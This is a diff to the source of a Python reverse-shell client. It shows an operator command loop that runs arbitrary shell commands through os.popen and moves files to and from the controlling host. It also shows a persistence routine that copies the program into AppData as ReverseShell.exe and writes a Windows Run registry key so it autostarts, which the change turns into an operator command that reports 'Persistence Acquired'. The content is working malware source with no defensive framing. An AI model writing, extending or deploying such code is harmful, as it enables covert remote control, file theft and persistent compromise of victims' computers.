@@ -35,10 +35,10 @@ def shell():
                 continue
         elif cmd[:8] == "download":
             download(cmd)
-            continue
         elif cmd[:6] == "upload":
             upload(cmd)
-            continue
+        elif cmd[:11] == "persistence":
+            persistence()
         else:
             try:
                 proc = os.popen(cmd)  # open a process to run commands on shell
@@ -64,6 +64,11 @@ def reliable_recv():
 
 
 def download(cmd):
+    """
+    Send a file to host
+    :param cmd:
+    :return:
+    """
     try:
         with open(cmd[9:], "rb") as file:
             reliable_send(base64.b64encode(file.read()))
@@ -73,6 +78,11 @@ def download(cmd):
 
 
 def upload(cmd):
+    """
+    Receive a file from host
+    :param cmd:
+    :return:
+    """
     try:
         with open(cmd[7:], "wb") as file:
             result = reliable_recv()
@@ -82,8 +92,11 @@ def upload(cmd):
         return False
 
 
-# write on Windows registry to autorun on startup
+#
 def persistence():
+    """
+    Acquire persistence writing on Windows registry to autorun on startup
+    """
     location = os.environ["appdata"] + "\\ReverseShell.exe"  # C:\Users\%username%\AppData\Roaming\ReverseShell.exe
     if not os.path.exists(location):
         # Copy this .exe file into the specified location
@@ -92,10 +105,12 @@ def persistence():
         # name the entry (/v), define the common register Type (/t), define the Data part (/d)
         os.popen(
             'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ReverseShell /t REG_SZ /d "' + location + '"')
+        reliable_send("Persistence Acquired")
+    else:
+        reliable_send("Persistence already acquired")
 
 
 if __name__ == '__main__':
-    persistence()
     client()
     shell()
     s.close()
